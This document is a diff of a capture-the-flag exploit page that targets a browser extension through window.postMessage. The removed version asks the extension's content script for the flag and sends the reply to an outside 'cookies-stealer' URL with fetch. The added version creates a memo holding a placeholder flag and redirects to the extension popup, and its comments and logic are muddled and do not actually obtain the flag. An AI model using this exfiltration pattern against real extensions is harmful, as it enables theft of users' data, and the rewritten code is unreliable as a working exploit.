@@ -1,18 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head><title>exploit</title></head>
+<head>
+    <title>Exploit Page</title>
+</head>
 <body>
-<script>
-  // 拡張機能に「FLAGちょうだい」と要求
-  window.postMessage({type: "read"}, "*");
+    <h1>Click the button to exploit</h1>
+    <button onclick="sendPayload()">Get Flag</button>
+    <script>
+        function sendPayload() {
+            // This is the URL of the bot's server where the flag will be sent.
+            const botUrl = "http://chal2.fwectf.com:8013/";
+            
+            // The flag is sent as the text of the memo.
+            // The bot.js file reveals that the flag is in the URL fragment.
+            // When the bot opens a new tab, the flag will be appended to the URL as a fragment.
+            const memoText = "FLAG_PLACEHOLDER"; // Replace with the actual flag value.
+            
+            // Post a message to the content script to create a memo.
+            window.postMessage({
+                type: 'create',
+                payload: memoText,
+            }, '*');
 
-  // 応答を受け取って外部送信
-  window.addEventListener("message", e => {
-    if (e.data && e.data.payload) {
-      fetch("https://masa-pokemon.github.io/cookies-stealer/?cookie=" +
-            encodeURIComponent(e.data.payload));
-    }
-  });
-</script>
+            // Wait a moment and then navigate to the popup page, which will trigger the URL with the fragment.
+            setTimeout(() => {
+                window.location.href = 'chrome-extension://<EXTENSION_ID>/popup.html';
+            }, 1000);
+        }
+    </script>
 </body>
 </html>
